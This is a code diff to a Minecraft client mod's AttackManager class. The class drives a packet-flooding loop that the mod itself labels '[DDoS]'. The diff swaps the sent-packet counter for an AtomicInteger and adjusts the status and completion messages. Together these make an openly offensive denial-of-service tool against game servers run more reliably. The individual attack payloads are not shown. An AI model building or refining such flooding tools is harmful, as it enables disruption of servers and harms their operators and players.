@@ -6,13 +6,14 @@ import net.minecraft.text.Text;
 
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
+import java.util.concurrent.atomic.AtomicInteger;
 
 public class AttackManager {
 
     private volatile boolean running = false;
     private volatile AttackType currentType = null;
     private volatile int packetCount = 0;
-    private volatile int sentCount = 0;
+    private final AtomicInteger sentCount = new AtomicInteger(0);
     private ExecutorService executor;
     private BaseAttack currentAttack;
 
@@ -21,21 +22,19 @@ public class AttackManager {
         running = true;
         currentType = type;
         packetCount = count;
-        sentCount = 0;
+        sentCount.set(0);
         executor = Executors.newSingleThreadExecutor();
-
         currentAttack = createAttack(type);
         if (currentAttack == null) return;
 
+        final int totalCount = count;
         executor.submit(() -> {
             MinecraftClient mc = MinecraftClient.getInstance();
-            int sent = 0;
-            while (running && sent < packetCount) {
+            while (running && sentCount.get() < totalCount) {
                 try {
                     if (mc.getNetworkHandler() == null) break;
                     currentAttack.execute(mc);
-                    sent++;
-                    sentCount = sent;
+                    int current = sentCount.incrementAndGet();
                     Thread.sleep(1);
                 } catch (Exception e) {
                     Thread.currentThread().interrupt();
@@ -43,10 +42,11 @@ public class AttackManager {
                 }
             }
             running = false;
+            final int finalSent = sentCount.get();
             mc.execute(() -> {
                 if (mc.player != null) {
                     mc.player.sendMessage(Text.literal(
-                        "[DDoS] Attack complete: " + sent + "/" + packetCount + " packets sent"
+                        "[DDoS] Attack complete: " + finalSent + "/" + totalCount + " packets sent"
                     ), false);
                 }
             });
@@ -61,15 +61,16 @@ public class AttackManager {
     }
 
     public void tick(MinecraftClient mc) {
-        if (running && mc.player != null && sentCount % 500 == 0 && sentCount > 0) {
+        int current = sentCount.get();
+        if (running && mc.player != null && current % 500 == 0 && current > 0) {
             mc.player.sendMessage(Text.literal(
-                "[DDoS] Status: " + sentCount + "/" + packetCount + " | Attack: " + currentType.displayName
+                "[DDoS] Status: " + current + "/" + packetCount + " | " + currentType.displayName
             ), true);
         }
     }
 
     public boolean isRunning() { return running; }
-    public int getSentCount() { return sentCount; }
+    public int getSentCount() { return sentCount.get(); }
     public int getPacketCount() { return packetCount; }
     public AttackType getCurrentType() { return currentType; }
 
